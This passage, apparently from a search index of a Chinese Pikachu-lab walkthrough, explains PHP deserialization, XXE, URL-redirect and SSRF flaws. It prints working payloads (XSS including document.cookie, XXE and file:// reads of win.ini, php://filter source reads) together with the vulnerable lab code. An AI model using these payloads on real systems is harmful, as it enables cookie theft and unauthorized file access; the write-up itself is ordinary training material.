    4:\u53d8\u91cf\u540d\u79f0\u7684\u957f\u5ea6\n        test:\u53d8\u91cf\u540d\u79f0\n        s:\u6570\u636e\u7c7b\u578b\n        7:\u53d8\u91cf\u503c\u7684\u957f\u5ea6\n        pikachu:\u53d8\u91cf\u503c\n</code></pre> \u53cd\u5e8f\u5217\u5316unserialize() \u5c31\u662f\u628a\u88ab\u5e8f\u5217\u5316\u7684\u5b57\u7b26\u4e32\u8fd8\u539f\u4e3a\u5bf9\u8c61,\u7136\u540e\u5728\u63a5\u4e0b\u6765\u7684\u4ee3\u7801\u4e2d\u7ee7\u7eed\u4f7f\u7528\u3002</p> <p>PHP<pre><code>$u=unserialize(\"O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\");\necho $u-&gt;test; //\u5f97\u5230\u7684\u7ed3\u679c\u4e3apikachu\n</code></pre> \u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u672c\u8eab\u6ca1\u6709\u95ee\u9898,\u4f46\u662f\u5982\u679c\u53cd\u5e8f\u5217\u5316\u7684\u5185\u5bb9\u662f\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u7684,\u4e14\u540e\u53f0\u4e0d\u6b63\u5f53\u7684\u4f7f\u7528\u4e86PHP\u4e2d\u7684\u9b54\u6cd5\u51fd\u6570,\u5c31\u4f1a\u5bfc\u81f4\u5b89\u5168\u95ee\u9898</p> PHP<pre><code>\u5e38\u89c1\u7684\u51e0\u4e2a\u9b54\u6cd5\u51fd\u6570:\n__construct()\u5f53\u4e00\u4e2a\u5bf9\u8c61\u521b\u5efa\u65f6\u88ab\u8c03\u7528\n__destruct()\u5f53\u4e00\u4e2a\u5bf9\u8c61\u9500\u6bc1\u65f6\u88ab\u8c03\u7528\n__toString()\u5f53\u4e00\u4e2a\u5bf9\u8c61\u88ab\u5f53\u4f5c\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f7f\u7528\n__sleep() \u5728\u5bf9\u8c61\u5728\u88ab\u5e8f\u5217\u5316\u4e4b\u524d\u8fd0\u884c\n__wakeup\u5c06\u5728\u5e8f\u5217\u5316\u4e4b\u540e\u7acb\u5373\u88ab\u8c03\u7528\n\n\u6f0f\u6d1e\u4e3e\u4f8b:\n\nclass S{\n    var $test = \"pikachu\";\n    function __destruct(){\n        echo $this-&gt;test;\n    }\n}\n$s = $_GET['test'];\n@$unser = unserialize($a);\n\npayload:O:1:\"S\":1:{s:4:\"test\";s:29:\"&lt;script&gt;alert('xss')&lt;/script&gt;\";}\n</code></pre>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#12x01-php","title":"12x01 PHP\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"<ol> <li>\u6211\u4eec\u5148\u5c1d\u8bd5\u8f93\u5165\u4efb\u610f\u5185\u5bb9\uff0c\u53d1\u73b0\u90fd\u4f1a\u8fd4\u56de\u6765\u4e00\u53e5\u8bdd \u6e90\u4ee3\u7801\u5982\u4e0b\uff1a\\pikachu\\vul\\unserilization\\unser.php</li> </ol> PHP<pre><code>$html='';\nif(isset($_POST['o'])){\n    $s = $_POST['o'];\n    if(!@$unser = unserialize($s)){\n        $html.=\"&lt;p&gt;\u5927\u5144\u5f1f,\u6765\u70b9\u52b2\u7206\u70b9\u513f\u7684!&lt;/p&gt;\";\n    }else{\n        $html.=\"&lt;p&gt;{$unser-&gt;test}&lt;/p&gt;\";\n    }\n\n}\n</code></pre> <ol> <li>\u8f93\u5165<code>O:1:\"S\":1:{s:4:\"test\";s:29:\"&lt;script&gt;alert('abc')&lt;/script&gt;\";}</code>\uff0c\u6210\u529f\u5f39\u7a97</li> </ol> <p>\u6ce8\uff1aPBW\u7684\u6587\u6863\u4e2d\u8bf4\u5982\u679c\u6211\u4eec\u60f3\u8981\u5f39\u7a97\u8fd4\u56decookie\uff0c\u4fee\u6539payload\u4e3a\uff1a <code>O:1:\"S\":1:{s:4:\"test\";s:39:\"&lt;script&gt;alert(document.cookie)&lt;/script&gt;\";}</code></p> <p>\u8fd9\u4e00\u5c0f\u8282\u4e2d\uff0c\u8868\u5355\u63a5\u6536\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e\u4e4b\u540e\u4f1a\u8fdb\u884c\u4f20\u9012\uff0c\u5f53\u8f93\u5165\u7684\u503c\u4e3a\u5e8f\u5217\u540e\u7684\u503c\u65f6\uff0cunserialize\u4f1a\u5bf9\u5176\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u7136\u540e\u8f93\u51fa\u663e\u793a$html\u3002</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#13-xxe","title":"13 XXE","text":"<p>XXE -\"xml external entity injection\" \u65e2\"xml\u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u6f0f\u6d1e\"\u3002 \u6982\u62ec\u4e00\u4e0b\u5c31\u662f\"\u653b\u51fb\u8005\u901a\u8fc7\u5411\u670d\u52a1\u5668\u6ce8\u5165\u6307\u5b9a\u7684xml\u5b9e\u4f53\u5185\u5bb9,\u4ece\u800c\u8ba9\u670d\u52a1\u5668\u6309\u7167\u6307\u5b9a\u7684\u914d\u7f6e\u8fdb\u884c\u6267\u884c,\u5bfc\u81f4\"\u95ee\u9898\" \u4e5f\u5c31\u662f\u8bf4\u670d\u52a1\u7aef\u63a5\u6536\u548c\u89e3\u6790\u4e86\u6765\u81ea\u7528\u6237\u7aef\u7684xml\u6570\u636e,\u800c\u53c8\u6ca1\u6709\u505a\u4e25\u683c\u7684\u5b89\u5168\u63a7\u5236,\u4ece\u800c\u5bfc\u81f4xml\u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u3002</p> <p>\u5177\u4f53\u7684\u5173\u4e8exml\u5b9e\u4f53\u7684\u4ecb\u7ecd,\u7f51\u7edc\u4e0a\u6709\u5f88\u591a,\u81ea\u5df1\u52a8\u624b\u5148\u67e5\u4e00\u4e0b\u3002 \u73b0\u5728\u5f88\u591a\u8bed\u8a00\u91cc\u9762\u5bf9\u5e94\u7684\u89e3\u6790xml\u7684\u51fd\u6570\u9ed8\u8ba4\u662f\u7981\u6b62\u89e3\u6790\u5916\u90e8\u5b9e\u4f53\u5185\u5bb9\u7684,\u4ece\u800c\u4e5f\u5c31\u76f4\u63a5\u907f\u514d\u4e86\u8fd9\u4e2a\u6f0f\u6d1e\u3002 \u4ee5PHP\u4e3a\u4f8b,\u5728PHP\u91cc\u9762\u89e3\u6790xml\u7528\u7684\u662flibxml,\u5176\u5728\u22652.9.0\u7684\u7248\u672c\u4e2d,\u9ed8\u8ba4\u662f\u7981\u6b62\u89e3\u6790xml\u5916\u90e8\u5b9e\u4f53\u5185\u5bb9\u7684\u3002</p> <p>\u672c\u7ae0\u63d0\u4f9b\u7684\u6848\u4f8b\u4e2d,\u4e3a\u4e86\u6a21\u62df\u6f0f\u6d1e,\u901a\u8fc7\u624b\u52a8\u6307\u5b9aLIBXML_NOENT\u9009\u9879\u5f00\u542f\u4e86xml\u5916\u90e8\u5b9e\u4f53\u89e3\u6790\u3002</p> <p>==XML\uff1a== XML \u6307\u53ef\u6269\u5c55\u6807\u8bb0\u8bed\u8a00\uff08EXtensible Markup Language\uff09 XML \u662f\u4e00\u79cd\u6807\u8bb0\u8bed\u8a00\uff0c\u5f88\u7c7b\u4f3c HTML XML \u7684\u8bbe\u8ba1\u5b97\u65e8\u662f\u4f20\u8f93\u6570\u636e\uff0c\u800c\u975e\u663e\u793a\u6570\u636e XML \u6807\u7b7e\u6ca1\u6709\u88ab\u9884\u5b9a\u4e49\u3002\u60a8\u9700\u8981\u81ea\u884c\u5b9a\u4e49\u6807\u7b7e\u3002 XML \u88ab\u8bbe\u8ba1\u4e3a\u5177\u6709\u81ea\u6211\u63cf\u8ff0\u6027\u3002 XML \u662f W3C \u7684\u63a8\u8350\u6807\u51c6</p> <p>==XML \u548c HTML \u4e4b\u95f4\u7684\u5dee\u5f02==</p> <ul> <li>XML \u88ab\u8bbe\u8ba1\u7528\u6765\u4f20\u8f93\u548c\u5b58\u50a8\u6570\u636e\uff0c\u5176\u7126\u70b9\u662f\u6570\u636e\u7684\u5185\u5bb9\u3002</li> <li>HTML \u88ab\u8bbe\u8ba1\u7528\u6765\u663e\u793a\u6570\u636e\uff0c\u5176\u7126\u70b9\u662f\u6570\u636e\u7684\u5916\u89c2</li> </ul> <p>\u63d0\u793a\u8981\u6c42\u201c\u5148\u628aXML\u58f0\u660e\u3001DTD\u6587\u6863\u7c7b\u578b\u5b9a\u4e49\u3001\u6587\u6863\u5143\u7d20\u8fd9\u4e9b\u57fa\u7840\u77e5\u8bc6\u81ea\u5df1\u770b\u4e00\u4e0b\u201d</p> <p>PHP<pre><code>\u7b2c\u4e00\u90e8\u5206\uff1aXML\u58f0\u660e\u90e8\u5206\n&lt;?xml version=\"1.0\"?&gt;\n\n\u7b2c\u4e8c\u90e8\u5206\uff1a\u6587\u6863\u7c7b\u578b\u5b9a\u4e49 DTD\n&lt;!DOCTYPE note[ \n&lt;!--\u5b9a\u4e49\u6b64\u6587\u6863\u662fnote\u7c7b\u578b\u7684\u6587\u6863--&gt;\n&lt;!ENTITY entity-name SYSTEM \"URI/URL\"&gt;\n&lt;!--\u5916\u90e8\u5b9e\u4f53\u58f0\u660e--&gt;\n]&gt;\n\n\u7b2c\u4e09\u90e8\u5206\uff1a\u6587\u6863\u5143\u7d20\n&lt;note&gt;\n&lt;to&gt;Dave&lt;/to&gt;\n&lt;from&gt;Tom&lt;/from&gt;\n&lt;head&gt;Reminder&lt;/head&gt;\n&lt;body&gt;You are a good man&lt;/body&gt;\n&lt;/note&gt;\n</code></pre> DTD\uff1aDocument Type Definition\u5373\u6587\u6863\u7c7b\u578b\u5b9a\u4e49\uff0c\u7528\u6765\u4e3aXML\u6587\u6863\u5b9a\u4e49\u8bed\u4e49\u7ea6\u675f\u3002</p> <p>PHP<pre><code>1.DTD\u5185\u90e8\u58f0\u660e\n&lt;!DOCTYPE \u6839\u5143\u7d20[\u5143\u7d20\u58f0\u660e]&gt;\n2. DTD\u5916\u90e8\u5f15\u7528\n&lt;!DOCTYPE\u6839\u5143\u7d20\u540d\u79f0SYSTEM \u201c\"\u5916\u90e8DTD\u7684URI\" &gt;\n3.\u5f15\u7528\u516c\u5171DTD\n&lt;!DOCTYPE\u6839\u5143\u7d20\u540d\u79f0PUBLIC \"DTD\u6807\u8bc6\u540d\u201d \u201c\u516c\u7528DTD\u7684URI\u201d &gt;\n</code></pre> \u5982\u679c\u4e00\u4e2a\u63a5\u53e3\u652f\u6301\u63a5\u6536xml\u6570\u636e\uff0c\u4e14\u6ca1\u6709\u5bf9xml\u6570\u636e\u505a\u4efb\u4f55\u5b89\u5168\u4e0a\u7684\u63aa\u65bd\uff0c\u5c31\u53ef\u80fd\u5bfc\u81f4XXE\u6f0f\u6d1e\u3002 simplexml load string()\u51fd\u6570\u8f6c\u6362\u5f62\u5f0f\u826f\u597d\u7684XML\u5b57\u7b26\u4e32\u4e3aSimpleXMLElement\u5bf9\u8c61 XXE\u6f0f\u6d1e\u53d1\u751f\u5728\u5e94\u7528\u7a0b\u5e8f\u89e3\u6790XML\u8f93\u5165\u65f6\uff0c\u6ca1\u6709\u7981\u6b62\u5916\u90e8\u5b9e\u4f53\u7684\u52a0\u8f7d\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u6076\u610f\u7684XML\u3002</p> PHP<pre><code>file:///path/to/file.ext\nhttp://url\nphp://filter/read=convert.base64-encode/resource=conf.php\n</code></pre>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#13x01-xxe","title":"13x01 XXE\u6f0f\u6d1e","text":"<ol> <li>\u6211\u4eec\u5148\u5c1d\u8bd5\u4e00\u4e0b \u5185\u90e8\u5b9e\u4f53\uff0c\u8f93\u5165\uff1a</li> </ol> <p>PHP<pre><code>&lt;?xml version=\"1.0\"?&gt; \n&lt;!DOCTYPE ANY [    \n&lt;!ENTITY xxe \"abc\" &gt; ]&gt; \n&lt;a&gt;&amp;xxe;&lt;/a&gt;\n</code></pre> \u8fd4\u56de\u6765abc\uff1a</p> <p> 2. \u6211\u4eec\u518d\u5c1d\u8bd5\u4e00\u4e0b \u5916\u90e8\u5b9e\u4f53\uff0c\u8f93\u5165\uff1a</p> <p>PHP<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE ANY [\n     &lt;!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\"&gt; ]&gt;\n&lt;a&gt;&amp;xxe;&lt;/a&gt;\n</code></pre> \u8fd4\u56de\u6570\u636e\u5982\u56fe\uff1a</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#14-url","title":"14 URL\u91cd\u5b9a\u5411","text":"<p>\u4e0d\u5b89\u5168\u7684url\u8df3\u8f6c</p> <p>\u4e0d\u5b89\u5168\u7684url\u8df3\u8f6c\u95ee\u9898\u53ef\u80fd\u53d1\u751f\u5728\u4e00\u5207\u6267\u884c\u4e86url\u5730\u5740\u8df3\u8f6c\u7684\u5730\u65b9\u3002 \u5982\u679c\u540e\u7aef\u91c7\u7528\u4e86\u524d\u7aef\u4f20\u8fdb\u6765\u7684(\u53ef\u80fd\u662f\u7528\u6237\u4f20\u53c2,\u6216\u8005\u4e4b\u524d\u9884\u57cb\u5728\u524d\u7aef\u9875\u9762\u7684url\u5730\u5740)\u53c2\u6570\u4f5c\u4e3a\u4e86\u8df3\u8f6c\u7684\u76ee\u7684\u5730,\u800c\u53c8\u6ca1\u6709\u505a\u5224\u65ad\u7684\u8bdd \u5c31\u53ef\u80fd\u53d1\u751f\"\u8df3\u9519\u5bf9\u8c61\"\u7684\u95ee\u9898\u3002</p> <p>url\u8df3\u8f6c\u6bd4\u8f83\u76f4\u63a5\u7684\u5371\u5bb3\u662f: --&gt;\u9493\u9c7c,\u65e2\u653b\u51fb\u8005\u4f7f\u7528\u6f0f\u6d1e\u65b9\u7684\u57df\u540d(\u6bd4\u5982\u4e00\u4e2a\u6bd4\u8f83\u51fa\u540d\u7684\u516c\u53f8\u57df\u540d\u5f80\u5f80\u4f1a\u8ba9\u7528\u6237\u653e\u5fc3\u7684\u70b9\u51fb)\u505a\u63a9\u76d6,\u800c\u6700\u7ec8\u8df3\u8f6c\u7684\u786e\u5b9e\u9493\u9c7c\u7f51\u7ad9</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#14x01-url","title":"14x01 \u4e0d\u5b89\u5168\u7684URL\u8df3\u8f6c","text":"<ol> <li>\u5728\u9875\u9762\u4e2d\u6709\u56db\u53e5\u8bdd\uff0c\u5176\u4e2d\u7b2c\u4e00\u53e5\u548c\u7b2c\u4e8c\u53e5\u6ca1\u6709\u53cd\u5e94\uff0c\u7b2c\u4e09\u53e5\u8fd4\u56de\u5230\u4e86URL\u91cd\u5b9a\u5411\u6982\u8ff0\u754c\u9762\uff0c\u7b2c\u56db\u53e5\u6709\u56de\u663e\uff0c\u800c\u4e14url\u591a\u4e86\u4e2a\u201curl=i\u201d</li> <li>\u6211\u4eec\u8fdb\u5982\u5f00\u53d1\u8005\u6a21\u5f0f\uff0c\u5982\u4e0b  \u6211\u4eec\u5c06\u7b2c\u56db\u5c40\u7684<code>i</code>\u6539\u4e3a<code>https://www.baidu.com/</code>\uff0c\u70b9\u51fb\u540e\u6210\u529f\u8df3\u8f6c\u767e\u5ea6\u3002</li> </ol>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#15-ssrf","title":"15 SSRF","text":"<p>SSRF(Server-Side Request Forgery:\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020) \u5176\u5f62\u6210\u7684\u539f\u56e0\u5927\u90fd\u662f\u7531\u4e8e\u670d\u52a1\u7aef\u63d0\u4f9b\u4e86\u4ece\u5176\u4ed6\u670d\u52a1\u5668\u5e94\u7528\u83b7\u53d6\u6570\u636e\u7684\u529f\u80fd,\u4f46\u53c8\u6ca1\u6709\u5bf9\u76ee\u6807\u5730\u5740\u505a\u4e25\u683c\u8fc7\u6ee4\u4e0e\u9650\u5236</p> <p>\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u4f20\u5165\u4efb\u610f\u7684\u5730\u5740\u6765\u8ba9\u540e\u7aef\u670d\u52a1\u5668\u5bf9\u5176\u53d1\u8d77\u8bf7\u6c42,\u5e76\u8fd4\u56de\u5bf9\u8be5\u76ee\u6807\u5730\u5740\u8bf7\u6c42\u7684\u6570\u636e</p> <p>\u6570\u636e\u6d41:\u653b\u51fb\u8005-----&gt;\u670d\u52a1\u5668----&gt;\u76ee\u6807\u5730\u5740</p> <p>\u6839\u636e\u540e\u53f0\u4f7f\u7528\u7684\u51fd\u6570\u7684\u4e0d\u540c,\u5bf9\u5e94\u7684\u5f71\u54cd\u548c\u5229\u7528\u65b9\u6cd5\u53c8\u6709\u4e0d\u4e00\u6837</p> <p>PHP<pre><code>PHP\u4e2d\u4e0b\u9762\u51fd\u6570\u7684\u4f7f\u7528\u4e0d\u5f53\u4f1a\u5bfc\u81f4SSRF:\nfile_get_contents()\nfsockopen()\ncurl_exec()\n</code></pre> \u5982\u679c\u4e00\u5b9a\u8981\u901a\u8fc7\u540e\u53f0\u670d\u52a1\u5668\u8fdc\u7a0b\u53bb\u5bf9\u7528\u6237\u6307\u5b9a(\"\u6216\u8005\u9884\u57cb\u5728\u524d\u7aef\u7684\u8bf7\u6c42\")\u7684\u5730\u5740\u8fdb\u884c\u8d44\u6e90\u8bf7\u6c42,\u5219\u8bf7\u505a\u597d\u76ee\u6807\u5730\u5740\u7684\u8fc7\u6ee4\u3002</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#15x01-ssrfcurl","title":"15x01 SSRF\uff08curl\uff09","text":"<p>==\u63d0\u793a\u8bf4\u201c\u5148\u4e86\u89e3\u4e00\u4e0bphp\u4e2dcurl\u76f8\u5173\u51fd\u6570\u7684\u7528\u6cd5\u5427\u201d\uff0c\u90a3\u6211\u4eec\u5c31\u4e86\u89e3\u4e00\u4e0b== curl_close()    \u5173\u95ed\u4e00\u4e2acURL\u4f1a\u8bdd\u3002 curl_copy_handle()    \u590d\u5236\u4e00\u4e2acURL\u53e5\u67c4\u548c\u5b83\u7684\u6240\u6709\u9009\u9879\u3002  curl_errno()    \u8fd4\u56de\u6700\u540e\u4e00\u6b21\u7684\u9519\u8bef\u53f7\u3002 curl_error()    \u8fd4\u56de\u4e00\u4e2a\u4fdd\u62a4\u5f53\u524d\u4f1a\u8bdd\u6700\u8fd1\u4e00\u6b21\u9519\u8bef\u7684\u5b57\u7b26\u4e32\u3002  curl_escape()   \u8fd4\u56de\u8f6c\u4e49\u5b57\u7b26\u4e32\uff0c\u5bf9\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u8fdb\u884cURL\u7f16\u7801\u3002  curl_exec()    \u6267\u884c\u4e00\u4e2acURL\u4f1a\u8bdd\u3002  curl_file_create() \u521b\u5efa\u4e00\u4e2a CURLFile \u5bf9\u8c61\u3002  curl_getinfo()    \u83b7\u53d6\u4e00\u4e2acURL\u8fde\u63a5\u8d44\u6e90\u53e5\u67c4\u7684\u4fe1\u606f\u3002 curl_init()   \u521d\u59cb\u5316\u4e00\u4e2acURL\u4f1a\u8bdd\u3002 curl_multi_add_handle()    \u5411curl\u6279\u5904\u7406\u4f1a\u8bdd\u4e2d\u6dfb\u52a0\u5355\u72ec\u7684curl\u53e5\u67c4\u3002 curl_multi_close()    \u5173\u95ed\u4e00\u7ec4cURL\u53e5\u67c4\u3002 curl_multi_exec()    \u8fd0\u884c\u5f53\u524d cURL\u53e5\u67c4\u7684\u5b50\u8fde\u63a5\u3002 curl_multi_getcontent()   \u5982\u679c\u8bbe\u7f6e\u4e86CURLOPT_RETURNTRANSFER\uff0c\u5219\u8fd4\u56de\u83b7\u53d6\u7684\u8f93\u51fa\u7684\u6587\u672c\u6d41\u3002 curl_multi_info_read()   \u83b7\u53d6\u5f53\u524d\u89e3\u6790\u7684cURL\u7684\u76f8\u5173\u4f20\u8f93\u4fe1\u606f\u3002  curl_multi_init()    \u8fd4\u56de\u4e00\u4e2a\u65b0cURL\u6279\u5904\u7406\u53e5\u67c4\u3002 curl_multi_remove_handle()    \u79fb\u9664curl\u6279\u5904\u7406\u53e5\u67c4\u8d44\u6e90\u4e2d\u7684\u67d0\u4e2a\u53e5\u67c4\u8d44\u6e90\u3002 curl_multi_select()    \u7b49\u5f85\u6240\u6709cURL\u6279\u5904\u7406\u4e2d\u7684\u6d3b\u52a8\u8fde\u63a5\u3002  curl_multi_setopt()   \u8bbe\u7f6e\u4e00\u4e2a\u6279\u5904\u7406cURL\u4f20\u8f93\u9009\u9879\u3002 curl_multi_strerror()    \u8fd4\u56de\u63cf\u8ff0\u9519\u8bef\u7801\u7684\u5b57\u7b26\u4e32\u6587\u672c\u3002  curl_pause() \u6682\u505c\u53ca\u6062\u590d\u8fde\u63a5\u3002 curl_reset()    \u91cd\u7f6elibcurl\u7684\u4f1a\u8bdd\u53e5\u67c4\u7684\u6240\u6709\u9009\u9879\u3002  curl_setopt_array()   \u4e3acURL\u4f20\u8f93\u4f1a\u8bdd\u6279\u91cf\u8bbe\u7f6e\u9009\u9879\u3002 curl_setopt()    \u8bbe\u7f6e\u4e00\u4e2acURL\u4f20\u8f93\u9009\u9879\u3002  curl_share_close()   \u5173\u95edcURL\u5171\u4eab\u53e5\u67c4\u3002 curl_share_init()    \u521d\u59cb\u5316cURL\u5171\u4eab\u53e5\u67c4\u3002  curl_share_setopt()   \u8bbe\u7f6e\u4e00\u4e2a\u5171\u4eab\u53e5\u67c4\u7684cURL\u4f20\u8f93\u9009\u9879\u3002  curl_strerror()    \u8fd4\u56de\u9519\u8bef\u4ee3\u7801\u7684\u5b57\u7b26\u4e32\u63cf\u8ff0\u3002  curl_unescape()   \u89e3\u7801URL\u7f16\u7801\u540e\u7684\u5b57\u7b26\u4e32\u3002  curl_version()    \u83b7\u53d6cURL\u7248\u672c\u4fe1\u606f\u3002</p> <ol> <li>\u6211\u4eec\u70b9\u51fb\u8d85\u94fe\u63a5\uff0c\u53d1\u73b0\u8fd4\u56de\u4e86\u4e00\u9996\u8bd7\uff0c\u540c\u65f6URL\u4e2d\u53d1\u751f\u4e86\u53d8\u5316  URL\uff1a<code>http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php</code></li> <li>\u6211\u4eec\u5c06<code>url=</code>\u540e\u9762\u7684\u5185\u5bb9\u4fee\u6539\u4e3a<code>https://www.baidu.com/</code>\uff0c\u53d1\u73b0\u6210\u529f\u8fd4\u56de\u4e86\u767e\u5ea6\u9875\u9762</li> <li>\u6211\u4eec\u8fd8\u53ef\u4ee5file\u534f\u8bae\uff0c\u67e5\u770b\u672c\u5730\u6587\u4ef6\uff1a<code>url=file:///c:/windows/win.ini</code></li> <li>\u6211\u4eec\u770b\u4e00\u4e0b\u540e\u7aef\\pikachu\\vul\\ssrf\\ssrf_curl.php</li> </ol> PHP<pre><code>if(isset($_GET['url']) &amp;&amp; $_GET['url'] != null){\n\n    //\u63a5\u6536\u524d\u7aefURL\u6ca1\u95ee\u9898,\u4f46\u662f\u8981\u505a\u597d\u8fc7\u6ee4,\u5982\u679c\u4e0d\u505a\u8fc7\u6ee4,\u5c31\u4f1a\u5bfc\u81f4SSRF\n    $URL = $_GET['url'];\n    $CH = curl_init($URL);\n    curl_setopt($CH, CURLOPT_HEADER, FALSE);\n    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);\n    $RES = curl_exec($CH);\n    curl_close($CH) ;\n//ssrf\u7684\u95ee\u662f:\u524d\u7aef\u4f20\u8fdb\u6765\u7684url\u88ab\u540e\u53f0\u4f7f\u7528curl_exec()\u8fdb\u884c\u4e86\u8bf7\u6c42,\u7136\u540e\u5c06\u8bf7\u6c42\u7684\u7ed3\u679c\u53c8\u8fd4\u56de\u7ed9\u4e86\u524d\u7aef\u3002\n//\u9664\u4e86http/https\u5916,curl\u8fd8\u652f\u6301\u4e00\u4e9b\u5176\u4ed6\u7684\u534f\u8baecurl --version \u53ef\u4ee5\u67e5\u770b\u5176\u652f\u6301\u7684\u534f\u8bae,telnet\n//curl\u652f\u6301\u5f88\u591a\u534f\u8bae\uff0c\u6709FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE\u4ee5\u53caLDAP\n    echo $RES;\n\n}\n</code></pre>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#15x02-ssrffile_get_content","title":"15x02 SSRF(file_get_content)","text":"<p>\u63d0\u793a\u8bf4\uff1a\u201c\u5148\u4e86\u89e3\u4e00\u4e0bfile_get_contents()\u76f8\u5173\u51fd\u6570\u7684\u7528\u6cd5\u5427\u201d\uff0c\u90a3\u6211\u4eec\u5c31\u518d\u4e86\u89e3\u4e00\u4e0b\u5176\u7528\u6cd5</p> <p>file_get_contents() \u51fd\u6570\u5c06\u6307\u5b9a URL \u7684\u6587\u4ef6\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\u5e76\u8fd4\u56de\u3002 \u8be5\u51fd\u6570\u662f\u7528\u4e8e\u628a\u6587\u4ef6\u7684\u5185\u5bb9\u8bfb\u5165\u5230\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\u7684\u9996\u9009\u65b9\u6cd5\u3002\u5982\u679c\u670d\u52a1\u5668\u64cd\u4f5c\u7cfb\u7edf\u652f\u6301\uff0c\u8fd8\u4f1a\u4f7f\u7528\u5185\u5b58\u6620\u5c04\u6280\u672f\u6765\u589e\u5f3a\u6027\u80fd\u3002</p> <p>==\u51fd\u6570\u7ed3\u6784==:  file_get_contents(path,include_path,context,start,max_length) path\uff1a\u8981\u8bfb\u53d6\u7684\u8def\u5f84\u6216\u94fe\u63a5\u3002  include_path\uff1a\u662f\u5426\u5728\u8def\u5f84\u4e2d\u641c\u7d22\u6587\u4ef6\uff0c\u641c\u7d22\u5219\u8bbe\u4e3a 1\uff0c\u9ed8\u8ba4\u4e3a false\u3002 context\uff1a\u4fee\u6539\u6d41\u7684\u884c\u4e3a\uff0c\u5982\u8d85\u65f6\u65f6\u95f4\uff0cGET / POST \u7b49\u3002 start\uff1a\u5f00\u59cb\u8bfb\u6587\u4ef6\u7684\u4f4d\u7f6e\u3002 max_length\uff1a\u8bfb\u53d6\u6587\u4ef6\u7684\u5b57\u8282\u6570\u3002 </p> <p>==file_get_contents \u548c curl \u533a\u522b\uff1a== curl \u652f\u6301\u66f4\u591a\u534f\u8bae\uff0c\u6709http\u3001https\u3001ftp\u3001gopher\u3001telnet\u3001dict\u3001file\u3001ldap\uff1b\u6a21\u62df Cookie\u767b\u5f55\uff0c\u722c\u53d6\u7f51\u9875\uff1bFTP \u4e0a\u4f20\u4e0b\u8f7d\u3002 fopen / file_get_contents \u53ea\u80fd\u4f7f\u7528 GET \u65b9\u5f0f\u83b7\u53d6\u6570\u636e\u3002 curl \u53ef\u4ee5\u8fdb\u884c DNS \u7f13\u5b58\uff0c\u540c\u4e00\u4e2a\u57df\u540d\u4e0b\u7684\u56fe\u7247\u6216\u5176\u5b83\u8d44\u6e90\u53ea\u9700\u8981\u8fdb\u884c\u4e00\u6b21DNS\u67e5\u8be2\u3002 curl \u76f8\u5bf9\u6765\u8bf4\u66f4\u52a0\u5feb\u901f\u7a33\u5b9a\uff0c\u8bbf\u95ee\u91cf\u9ad8\u7684\u65f6\u5019\u9996\u9009 curl\uff0c\u7f3a\u70b9\u5c31\u662f\u76f8\u5bf9\u4e8e file_get_contents\u914d\u7f6e\u7e41\u7410\uff0cfile_get_contents \u9002\u7528\u4e0e\u5904\u7406\u5c0f\u8bbf\u95ee\u7684\u5e94\u7528\u3002</p> <ol> <li>\u6211\u4eec\u8fd8\u662f\u70b9\u51fb\u94fe\u63a5\uff0c\u53d1\u73b0\u8fd9\u6b21\u7684URL\u4e2d\u53d8\u6210\u4e86?file=\uff0c\u5b8c\u6574\u94fe\u63a5\u5982\u4e0b\uff1a</li> </ol> <p>PHP<pre><code>http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info2.php\n</code></pre>  2. \u6211\u4eec\u5c1d\u8bd5\u53bb\u4fee\u6539\uff0c<code>file:///c:/windows/win.ini</code>\uff0c\u53d1\u73b0\u6210\u529f\u8fd4\u56de3. \u6211\u4eec\u518d\u6765\u770b\u770b\u540e\u7aef\u957f\u4ec0\u4e48\u6837\u5b50\uff1a\\pikachu\\vul\\ssrf\\ssrf_fgc.php</p> <p>PHP<pre><code>//\u8bfb\u53d6PHP\u6587\u4ef6\u7684\u6e90\u7801:php:///read=convert.base64-encode/resource=ssrf.php\n//\u5185\u7f51\u8bf7\u6c42:http://x.x.x.x/xx.index\nif(isset($_GET['file']) &amp;&amp; $_GET['file'] !=null){\n    $filename = $_GET['file'];\n    $str = 